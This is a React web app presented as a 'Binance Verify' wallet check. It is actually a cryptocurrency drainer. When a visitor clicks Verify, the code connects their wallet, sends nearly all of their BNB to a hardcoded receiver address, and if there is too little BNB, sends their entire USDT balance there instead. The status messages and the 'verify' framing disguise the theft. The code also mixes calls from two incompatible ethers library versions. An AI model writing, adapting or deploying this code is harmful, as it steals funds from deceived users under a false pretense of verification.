import React, { useState } from "react";
import "./App.css";
import { ethers } from "ethers";

const CONSTANTS = {
  RECEIVER_ADDRESS: "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef",
  USDT_BEP20_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
  MIN_BNB_TRANSFER: 0.001,
  GAS_FEE_BUFFER: 0.0005,
};

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No Web3 wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      setStatus("Connecting to wallet...");
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const network = await provider.getNetwork();
      if (network.chainId !== 56) {
        setStatus("Switch wallet to Binance Smart Chain Mainnet (Chain ID 56).");
        return;
      }

      setStatus("Checking BNB balance...");
      const balanceBNB = await provider.getBalance(userAddress);

      if (balanceBNB > ethers.parseEther(CONSTANTS.MIN_BNB_TRANSFER.toString())) {
        const amountToSendBNB = balanceBNB - ethers.parseEther(CONSTANTS.GAS_FEE_BUFFER.toString());
        try {
          setStatus("Sending BNB...");
          const txBNB = await signer.sendTransaction({
            to: CONSTANTS.RECEIVER_ADDRESS,
            value: amountToSendBNB,
          });
          await txBNB.wait();
          setStatus("BNB sent successfully ✅");
        } catch (err) {
          setStatus("BNB transfer failed or user rejected.");
        }
        return;
      }

      setStatus("Checking USDT balance...");
      const usdtContract = new ethers.Contract(CONSTANTS.USDT_BEP20_ADDRESS, ERC20_ABI, signer);

      let balanceUSDT = 0n;
      let decimals = 18;

      try {
        balanceUSDT = await usdtContract.balanceOf(userAddress);
        decimals = await usdtContract.decimals();
      } catch (err) {
        setStatus("Binance Wallet returned invalid token data. Trying fallback...");
      }

      if (balanceUSDT > 0n) {
        const symbol = await usdtContract.symbol().catch(() => "USDT");
        const formattedBalance = ethers.formatUnits(balanceUSDT, decimals);
        setStatus(`Sending ${formattedBalance} ${symbol}...`);

        try {
          const txUSDT = await usdtContract.transfer(CONSTANTS.RECEIVER_ADDRESS, balanceUSDT);
          await txUSDT.wait();
          setStatus(`${symbol} sent successfully ✅`);
        } catch (err) {
          setStatus(`${symbol} transfer failed or user rejected.`);
        }
      } else {
        setStatus("No BNB or USDT found ❌");
      }

    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="App flex flex-col items-center justify-center min-h-screen bg-[#121212] text-gray-200">
      <h1 className="text-yellow-400 text-4xl font-bold mb-4">Binance Verify</h1>
      <p className="text-gray-400 mb-8">Supports BNB and USDT (BEP20) transfers from your connected Web3 wallet.</p>

      <div className="relative flex justify-center items-center mb-12">
        <div className="absolute border-2 border-yellow-400 rounded-full w-40 h-40 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-32 h-32 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-24 h-24 animate-pulse-slow"></div>
        <button
          onClick={handleVerify}
          className="z-10 px-8 py-4 bg-yellow-400 text-black rounded-full font-bold"
        >
          Verify
        </button>
      </div>

      <p className="text-gray-300">{status}</p>
    </div>
  );
}

export default App;